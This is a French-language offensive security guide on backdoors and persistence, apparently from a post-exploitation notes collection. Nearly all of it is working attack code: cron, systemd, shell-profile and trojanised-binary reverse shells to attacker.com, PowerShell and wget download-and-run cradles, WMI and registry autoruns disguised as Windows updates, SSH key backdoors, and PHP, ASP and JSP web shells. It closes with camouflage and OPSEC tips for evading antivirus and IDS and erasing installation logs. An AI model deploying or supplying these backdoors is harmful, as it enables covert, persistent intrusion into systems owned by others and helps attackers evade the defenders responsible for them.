# Backdoors et Persistance - Guide Complet

## üóÇÔ∏è Workflow de mise en place de backdoors
1. Choix de la m√©thode de persistance (service, t√¢che, autorun)
   ‚Üì
2. Cr√©ation ou modification des √©l√©ments de persistance
   ‚Üì
3. Test de l'activation et de la reconnexion
   ‚Üì
4. Camouflage et discr√©tion (noms l√©gitimes, processus syst√®me)
   ‚Üì
5. Mise en place de m√©canismes de fallback
   ‚Üì
6. Documentation pour maintenance et suppression

## üìã Vue d'ensemble

Les backdoors permettent de maintenir un acc√®s persistant √† un syst√®me compromis m√™me apr√®s red√©marrage ou d√©connexion. Elles doivent √™tre discr√®tes et r√©sistantes aux nettoyages de s√©curit√©.

> **üí° Explication Simple** : C'est comme cacher une cl√© de rechange dans le jardin. M√™me si la porte principale est verrouill√©e ou chang√©e, on peut toujours rentrer par notre passage secret.

## üêß Backdoors Linux

### T√¢ches Cron
```bash
# Backdoor via crontab utilisateur
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# Backdoor syst√®me (n√©cessite root)
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/crontab

# Backdoor dans /etc/cron.d/
echo "*/5 * * * * root /usr/local/bin/system_update.sh" > /etc/cron.d/system-update
```

### Services Systemd
```bash
# Cr√©er un service persistant
cat > /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Activer le service
systemctl enable system-monitor.service
systemctl start system-monitor.service
```

### SSH Backdoors
```bash
# Cl√© SSH autoris√©e
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... user@attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Backdoor dans sshd_config (n√©cessite root)
echo "Port 2222" >> /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
systemctl restart sshd
```

### Alias et RC Files
```bash
# Backdoor dans .bashrc
echo 'alias ls="ls $@ && (/bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\" &)"' >> ~/.bashrc

# Backdoor dans .profile
echo '[ -z "$PS1" ] || (/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &)' >> ~/.profile

# Backdoor globale
echo '(/usr/bin/wget -qO- http://attacker.com/payload.sh | bash &)' >> /etc/profile
```

### Binaires L√©gitimes Modifi√©s
```bash
# Remplacer un binaire syst√®me (sauvegarde de l'original)
cp /bin/ps /bin/ps.orig
cat > /bin/ps << 'EOF'
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &
/bin/ps.orig "$@"
EOF
chmod +x /bin/ps
```

## ü™ü Backdoors Windows

### Services Windows
```batch
# Cr√©er un service personnalis√©
sc create "WindowsUpdate" binPath= "C:\Windows\System32\payload.exe" start= auto
sc description "WindowsUpdate" "Windows Update Background Service"
sc start "WindowsUpdate"

# Modifier un service existant
sc config "Spooler" binPath= "C:\Windows\System32\payload.exe"
```

### T√¢ches Planifi√©es
```batch
# T√¢che planifi√©e d√©guis√©e
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\Automatic App Update" /tr "C:\Windows\System32\payload.exe" /sc minute /mo 30 /ru SYSTEM /f

# T√¢che au d√©marrage
schtasks /create /tn "SystemBootManager" /tr "powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"" /sc onstart /ru SYSTEM /f
```

### Registre Windows
```batch
# Autorun dans HKLM (n√©cessite admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d "C:\Windows\System32\payload.exe" /f

# Autorun utilisateur
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UserAccountManager" /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Local\update.exe" /f

# Services dans le registre
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\System32\payload.exe" /f
```

### WMI Backdoors
```powershell
# Event Filter WMI
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemBootFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
}

# Event Consumer WMI
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemBootConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
}

# Binding
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

### PowerShell Profiles
```powershell
# Backdoor dans profil PowerShell
$ProfilePath = $PROFILE.AllUsersAllHosts
"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" | Out-File -Append -FilePath $ProfilePath

# Ou profil utilisateur
"Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList '-Command IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')'" | Out-File -Append -FilePath $PROFILE
```

## üåê Web Shells

### PHP Web Shell
```php
<?php
// Webshell PHP simple mais efficace
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
</body>
</html>
```

### ASP/ASPX Web Shell
```asp
<%
If Request.Form("cmd") <> "" Then
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objShell.Exec(Request.Form("cmd"))
    Response.Write("<pre>")
    Response.Write(objCmdExec.StdOut.ReadAll())
    Response.Write("</pre>")
End If
%>

<form method="post">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
```

### JSP Web Shell
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
}
%>

<form method="get">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
```

## üîí Techniques de Camouflage

### Noms de fichiers l√©gitimes
```bash
# Linux - noms syst√®me typiques
svchost
systemd-resolve
networkd-dispatcher
update-notifier

# Windows - noms syst√®me typiques
svchost.exe
conhost.exe
dwm.exe
winlogon.exe
explorer.exe
```

### Emplacements discrets
```bash
# Linux
/usr/lib/systemd/system-sleep/
/etc/cron.d/
/usr/share/applications/
/opt/google/chrome/
/var/lib/dpkg/

# Windows
C:\Windows\System32\
C:\Windows\SysWOW64\
C:\ProgramData\Microsoft\Windows\
C:\Users\Public\Libraries\
%APPDATA%\Microsoft\Windows\
```

### Processus parents l√©gitimes
```bash
# Linux - lancer depuis processus syst√®me
nohup /path/to/backdoor &

# Windows - injection dans processus l√©gitime
# Utiliser process hollowing ou DLL injection
```

## üõ°Ô∏è Conseils OPSEC
- Utiliser des noms et emplacements de fichiers l√©gitimes
- √âviter les connexions r√©seau trop fr√©quentes (d√©tectable)
- Impl√©menter des m√©canismes de dormance et r√©veil
- Ne jamais utiliser de ports standards (22, 80, 443) pour les backdoors
- Chiffrer les communications pour √©viter la d√©tection IDS/IPS

## ‚ö†Ô∏è Erreurs fr√©quentes
- Laisser des backdoors trop √©videntes (noms suspects, emplacements visibles)
- Ne pas tester la persistance apr√®s red√©marrage
- Oublier de nettoyer les logs d'installation des backdoors
- Utiliser des payloads non-obfusqu√©s (d√©tection antivirus)
- Ne pas pr√©voir de m√©canisme de suppression propre

## üí° Astuces
- Combiner plusieurs m√©thodes de persistance pour la redondance
- Utiliser des techniques Living-off-the-Land quand possible
- Impl√©menter des checks de connectivit√© avant activation
- Cr√©er des backdoors qui s'auto-d√©truisent apr√®s X temps
- Documenter tous les m√©canismes pour faciliter le nettoyage

## üîó Pour aller plus loin
- [PayloadsAllTheThings - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Persistence)
- [HackTricks - Persistence](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#persistence)
- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [LOLBAS](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)

## üß≠ Navigation
- [Guide Lateral Movement](./Lateral_Movement.md)
- [Guide Data Exfiltration](./Data_Exfiltration.md)
- [Retour √† la post-exploitation](./README.md) 